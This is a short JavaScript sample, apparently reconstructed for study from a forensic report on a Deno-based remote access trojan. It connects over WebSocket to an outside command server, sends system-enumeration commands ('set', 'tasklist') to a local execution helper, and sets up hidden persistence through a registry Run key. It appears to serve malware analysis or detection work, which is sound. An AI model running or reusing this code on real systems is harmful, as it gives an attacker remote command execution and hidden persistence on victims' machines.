// Inert static sample reconstructed from DFIR.ch "Anatomy of a Deno-Based Proxy & RAT".
// SHA-256 in report for original back.js: 9469268c421b7821f897deb2d4d2316b21ff5da35bef417aa4e284010ef78302
const ws = new WebSocket("wss://d2cff16eusb8mg.cloudfront.net/socket");
const helper = "http://127.0.0.1:10021/exec";

ws.onopen = async () => {
  await fetch(helper, {
    method: "POST",
    body: JSON.stringify({ command: "set && echo diagnostic && tasklist" }),
  });
};

async function installPersistence(denoPath, workingDirectory) {
  const command =
    'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Deno_AutoRun /t REG_SZ /d "conhost.exe --headless ' +
    denoPath +
    ' --allow-run ' +
    workingDirectory +
    'app.js" /f';
  return fetch(helper, {
    method: "POST",
    body: JSON.stringify({ command }),
  });
}

async function removePersistence() {
  return fetch(helper, {
    method: "POST",
    body: JSON.stringify({
      command: 'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Deno_AutoRun /f',
    }),
  });
}
